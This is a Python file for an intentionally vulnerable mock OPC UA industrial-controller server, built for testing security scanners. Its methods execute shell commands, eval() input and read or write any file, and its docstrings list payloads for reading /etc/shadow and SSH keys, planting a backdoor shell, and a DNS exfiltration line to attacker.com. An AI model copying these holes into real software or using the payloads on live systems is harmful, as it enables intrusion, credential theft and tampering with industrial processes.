#!/usr/bin/env python3
"""
Vulnerable OPC UA Server for Security Testing

This mock OPC UA server is intentionally vulnerable for testing security scanners.
It includes:
- Anonymous access (no authentication required)
- Command injection vulnerabilities in method calls
- Path traversal in file operations
- Exposed sensitive information

WARNING: This is for AUTHORIZED SECURITY TESTING ONLY.
Do NOT expose this server to untrusted networks.

Usage:
    python opcua_vulnerable.py [--port 4840] [--host 0.0.0.0]
"""

import asyncio
import argparse
import logging
import subprocess
import os

try:
    from asyncua import Server, ua
    from asyncua.common.methods import uamethod
except ImportError:
    print("ERROR: asyncua not installed. Run: pip install asyncua")
    exit(1)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("opcua-vulnerable")


# =============================================================================
# VULNERABLE METHOD IMPLEMENTATIONS
# =============================================================================


@uamethod
async def execute_command(parent, command: str) -> str:
    """
    VULNERABLE: Direct command injection - executes shell commands without sanitization.

    Exploit examples:
        - execute_command("id")
        - execute_command("cat /etc/passwd")
        - execute_command("ls; cat /etc/shadow")
        - execute_command("$(whoami)")
    """
    logger.warning(f"[VULN] execute_command called with: {command}")
    try:
        # VULNERABLE: No input sanitization, direct shell execution
        result = subprocess.run(
            command,
            shell=True,  # VULNERABLE: shell=True allows command injection
            capture_output=True,
            text=True,
            timeout=30,
        )
        output = result.stdout + result.stderr
        return output if output else "(no output)"
    except subprocess.TimeoutExpired:
        return "Command timed out"
    except Exception as e:
        return f"Error: {str(e)}"


@uamethod
async def ping_host(parent, hostname: str) -> str:
    """
    VULNERABLE: Command injection via hostname parameter.

    Exploit examples:
        - ping_host("127.0.0.1; cat /etc/passwd")
        - ping_host("localhost && id")
        - ping_host("$(whoami).attacker.com")
    """
    logger.warning(f"[VULN] ping_host called with: {hostname}")
    try:
        # VULNERABLE: Hostname is passed directly to shell
        result = subprocess.run(
            f"ping -c 1 -W 2 {hostname}",  # VULNERABLE: No escaping
            shell=True,
            capture_output=True,
            text=True,
            timeout=10,
        )
        return result.stdout + result.stderr
    except Exception as e:
        return f"Error: {str(e)}"


@uamethod
async def dns_lookup(parent, domain: str) -> str:
    """
    VULNERABLE: Command injection via domain parameter.

    Exploit examples:
        - dns_lookup("example.com; id")
        - dns_lookup("$(cat /etc/passwd | base64)")
    """
    logger.warning(f"[VULN] dns_lookup called with: {domain}")
    try:
        # VULNERABLE: Domain passed directly to shell command
        result = subprocess.run(
            f"nslookup {domain}",  # VULNERABLE: No escaping
            shell=True,
            capture_output=True,
            text=True,
            timeout=10,
        )
        return result.stdout + result.stderr
    except Exception as e:
        return f"Error: {str(e)}"


@uamethod
async def read_file(parent, filepath: str) -> str:
    """
    VULNERABLE: Path traversal - can read any file on the system.

    Exploit examples:
        - read_file("/etc/passwd")
        - read_file("../../../etc/shadow")
        - read_file("/home/user/.ssh/id_rsa")
    """
    logger.warning(f"[VULN] read_file called with: {filepath}")
    try:
        # VULNERABLE: No path validation, allows directory traversal
        with open(filepath, "r") as f:
            content = f.read(10000)  # Limit to 10KB
        return content
    except Exception as e:
        return f"Error reading file: {str(e)}"


@uamethod
async def write_file(parent, filepath: str, content: str) -> str:
    """
    VULNERABLE: Arbitrary file write - can write to any writable location.

    Exploit examples:
        - write_file("/tmp/backdoor.sh", "#!/bin/bash\n/bin/bash -i")
        - write_file("~/.ssh/authorized_keys", "ssh-rsa AAAA...")
    """
    logger.warning(f"[VULN] write_file called with: {filepath}")
    try:
        # VULNERABLE: No path validation
        filepath = os.path.expanduser(filepath)
        with open(filepath, "w") as f:
            f.write(content)
        return f"Successfully wrote {len(content)} bytes to {filepath}"
    except Exception as e:
        return f"Error writing file: {str(e)}"


@uamethod
async def list_directory(parent, path: str) -> str:
    """
    VULNERABLE: Directory listing with path traversal.

    Exploit examples:
        - list_directory("/")
        - list_directory("/etc")
        - list_directory("../../..")
    """
    logger.warning(f"[VULN] list_directory called with: {path}")
    try:
        # VULNERABLE: No path validation
        entries = os.listdir(path)
        return "\n".join(entries[:100])  # Limit to 100 entries
    except Exception as e:
        return f"Error: {str(e)}"


@uamethod
async def get_env_var(parent, var_name: str) -> str:
    """
    VULNERABLE: Environment variable disclosure.
    Can leak sensitive information like API keys, passwords, paths.
    """
    logger.warning(f"[VULN] get_env_var called with: {var_name}")
    if var_name == "*":
        # Return all env vars
        return "\n".join(f"{k}={v}" for k, v in os.environ.items())
    return os.environ.get(var_name, f"Variable '{var_name}' not found")


@uamethod
async def eval_expression(parent, expression: str) -> str:
    """
    VULNERABLE: Python code execution via eval().

    Exploit examples:
        - eval_expression("__import__('os').system('id')")
        - eval_expression("open('/etc/passwd').read()")
    """
    logger.warning(f"[VULN] eval_expression called with: {expression}")
    try:
        # EXTREMELY VULNERABLE: Direct eval of user input
        result = eval(expression)  # noqa: S307 — the vulnerability IS the eval; intentional in a vuln mock
        return str(result)
    except Exception as e:
        return f"Error: {str(e)}"


# =============================================================================
# SERVER SETUP
# =============================================================================


async def create_server(host: str = "0.0.0.0", port: int = 4840) -> Server:
    """Create and configure the vulnerable OPC UA server."""

    server = Server()
    await server.init()

    server.set_endpoint(f"opc.tcp://{host}:{port}/vulnerable/")
    server.set_server_name("Vulnerable ICS Controller v1.0")

    # VULNERABLE: Allow anonymous access (no authentication)
    server.set_security_policy([ua.SecurityPolicyType.NoSecurity])

    # Set up namespace
    uri = "http://vulnerable-ics.example.com"
    idx = await server.register_namespace(uri)

    # Create main objects folder
    objects = server.nodes.objects

    # Create ICS Controller object
    controller = await objects.add_object(idx, "ICSController")

    # Add vulnerable methods to the controller
    await controller.add_method(
        idx,
        "ExecuteCommand",
        execute_command,
        [ua.VariantType.String],  # Input: command string
        [ua.VariantType.String],  # Output: command result
    )

    await controller.add_method(
        idx, "PingHost", ping_host, [ua.VariantType.String], [ua.VariantType.String]
    )

    await controller.add_method(
        idx, "DnsLookup", dns_lookup, [ua.VariantType.String], [ua.VariantType.String]
    )

    await controller.add_method(
        idx, "ReadFile", read_file, [ua.VariantType.String], [ua.VariantType.String]
    )

    await controller.add_method(
        idx,
        "WriteFile",
        write_file,
        [ua.VariantType.String, ua.VariantType.String],
        [ua.VariantType.String],
    )

    await controller.add_method(
        idx, "ListDirectory", list_directory, [ua.VariantType.String], [ua.VariantType.String]
    )

    await controller.add_method(
        idx, "GetEnvVar", get_env_var, [ua.VariantType.String], [ua.VariantType.String]
    )

    await controller.add_method(
        idx, "EvalExpression", eval_expression, [ua.VariantType.String], [ua.VariantType.String]
    )

    # Add some "sensitive" variables that should be protected
    secrets_folder = await controller.add_folder(idx, "Secrets")

    # Exposed passwords (VULNERABLE: sensitive data in OPC UA)
    await secrets_folder.add_variable(idx, "DatabasePassword", "SuperSecret123!")
    await secrets_folder.add_variable(idx, "APIKey", "sk-1234567890abcdef")
    await secrets_folder.add_variable(idx, "AdminPassword", "admin:Password123")
    await secrets_folder.add_variable(idx, "EncryptionKey", "AES256-KEY-DO-NOT-SHARE")

    # System information folder
    system_folder = await controller.add_folder(idx, "SystemInfo")
    await system_folder.add_variable(idx, "Hostname", os.uname().nodename)
    await system_folder.add_variable(idx, "OS", f"{os.uname().sysname} {os.uname().release}")
    await system_folder.add_variable(idx, "CurrentUser", os.getenv("USER", "unknown"))
    await system_folder.add_variable(idx, "HomeDirectory", os.path.expanduser("~"))
    await system_folder.add_variable(idx, "WorkingDirectory", os.getcwd())

    # Process variables (simulated PLC data)
    process_folder = await controller.add_folder(idx, "ProcessData")

    temp_var = await process_folder.add_variable(idx, "Temperature", 72.5)
    await temp_var.set_writable()

    pressure_var = await process_folder.add_variable(idx, "Pressure", 14.7)
    await pressure_var.set_writable()

    flow_var = await process_folder.add_variable(idx, "FlowRate", 100.0)
    await flow_var.set_writable()

    # VULNERABLE: Critical setpoint that shouldn't be directly writable
    setpoint_var = await process_folder.add_variable(idx, "CriticalSetpoint", 500)
    await setpoint_var.set_writable()  # VULNERABLE: No access control

    valve_var = await process_folder.add_variable(idx, "ValvePosition", 50)
    await valve_var.set_writable()

    # Emergency stop (should require authentication in real systems)
    estop_var = await process_folder.add_variable(idx, "EmergencyStop", False)
    await estop_var.set_writable()  # VULNERABLE: Can be toggled by anyone

    return server


async def main():
    parser = argparse.ArgumentParser(description="Vulnerable OPC UA Server for Security Testing")
    parser.add_argument("--host", default="0.0.0.0", help="Bind address (default: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=4840, help="Port (default: 4840)")
    args = parser.parse_args()

    print("""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                    VULNERABLE OPC UA SERVER - SECURITY TESTING                 ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║  WARNING: This server is INTENTIONALLY VULNERABLE for testing purposes.        ║
║  DO NOT expose to untrusted networks or use in production!                     ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║  Vulnerabilities:                                                              ║
║    - Anonymous access (no authentication)                                      ║
║    - Command injection in ExecuteCommand, PingHost, DnsLookup                  ║
║    - Path traversal in ReadFile, WriteFile, ListDirectory                      ║
║    - Python eval() in EvalExpression                                           ║
║    - Exposed secrets in /Secrets folder                                        ║
║    - Writable critical process variables                                       ║
╚═══════════════════════════════════════════════════════════════════════════════╝
""")

    server = await create_server(args.host, args.port)

    logger.info(
        f"Starting vulnerable OPC UA server on opc.tcp://{args.host}:{args.port}/vulnerable/"
    )
    logger.info("Press Ctrl+C to stop")

    async with server:
        while True:
            await asyncio.sleep(1)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nServer stopped.")
